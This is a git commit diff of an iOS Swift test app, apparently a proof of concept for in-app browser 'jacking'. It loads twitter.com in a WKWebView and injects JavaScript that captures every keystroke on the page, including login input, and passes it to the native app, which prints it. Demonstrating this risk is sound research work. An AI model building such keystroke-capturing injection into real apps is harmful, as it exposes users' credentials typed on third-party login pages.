a87fc554edb903e653363007e229af4c0c5e6770
Hiroki Akiyama <akiyama@akiroom.com>
2021-01-19 19:57:59 +0900

    とりあえずxssできたような気がする

--- jacking-test/ViewController.swift
+++ jacking-test/ViewController.swift
@@ -6,14 +6,45 @@
 //
 
 import UIKit
+import WebKit
 
-class ViewController: UIViewController {
-
+class ViewController: UIViewController, WKNavigationDelegate, WKScriptMessageHandler {
+    @IBOutlet weak var webView: WKWebView!
+    
     override func viewDidLoad() {
         super.viewDidLoad()
-        // Do any additional setup after loading the view.
+        webView.navigationDelegate = self
+        
+        // JavaScriptで取得したキーイベントをすべてselfにpostするための
+        // JavaScriptをWKWebViewに仕込む
+        let userController:WKUserContentController = WKUserContentController()
+        let js:String = """
+            document.onkeyup = function(event) {
+                var message = {'key': event.key};
+                window.webkit.messageHandlers.keyUpHandler.postMessage(message);
+                
+                // WKWebViewのコンソールに出力
+                console.log('テスト', event);
+            }
+        """
+        let userScript:WKUserScript =  WKUserScript(
+            source: js, injectionTime: WKUserScriptInjectionTime.atDocumentEnd, forMainFrameOnly: false
+        )
+        userController.addUserScript(userScript)
+        webView.configuration.userContentController.addUserScript(userScript)
+        webView.configuration.userContentController.add(self, contentWorld: WKContentWorld.page, name: "keyUpHandler")
+        
+        // https://twitter.com/loginを開く
+        // (アプリ内ブラウザでSNSログインする状況を想定)
+        guard let url: URL = URL(string: "https://twitter.com/") else { return }
+        let request = URLRequest.init(url: url)
+        webView.load(request)
     }
 
-
+    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
+        if message.name == "keyUpHandler" {
+            // JavaScriptからpostされたメッセージをXcodeのコンソールに出力
+            print(message.body)
+        }
+    }
 }
-
